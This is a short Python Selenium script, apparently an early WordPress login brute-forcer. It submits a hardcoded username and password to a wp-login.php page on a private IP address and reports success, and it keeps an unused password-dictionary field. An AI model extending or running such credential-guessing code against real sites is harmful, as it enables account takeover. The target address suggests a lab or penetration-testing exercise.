# Lets you attempt a wordpress admin panel login automatically

from selenium import webdriver

class Login:

    URL = 'http://10.225.147.156/wp-login.php'
    passwordDictionary = []
    username = "sigurda"
    password = "test"
    websiteDriver = None
    service = None

    def __init__(self):
        self.websiteDriver = webdriver.Chrome()

    def test_formlogon(self):
        self.websiteDriver.get(self.URL)

        username_input = self.websiteDriver.find_element_by_id("user_login")
        username_input.send_keys(self.username)

        password_input = self.websiteDriver.find_element_by_id("user_pass")
        password_input.send_keys(self.password)

        login_attempt = self.websiteDriver.find_element_by_xpath("//*[@type='submit']")
        login_attempt.submit()

        if self.websiteDriver.find_element_by_id("wp-submit"):
            print("The login was unsuccessful with password " + self.password + " and the username " + self.username)
        else:
            print("The login was successfull! the password for user: " + self.username + " is: " + self.password)
        self.websiteDriver.save_screenshot('screen.png')
        self.websiteDriver.quit()


Login().test_formlogon()
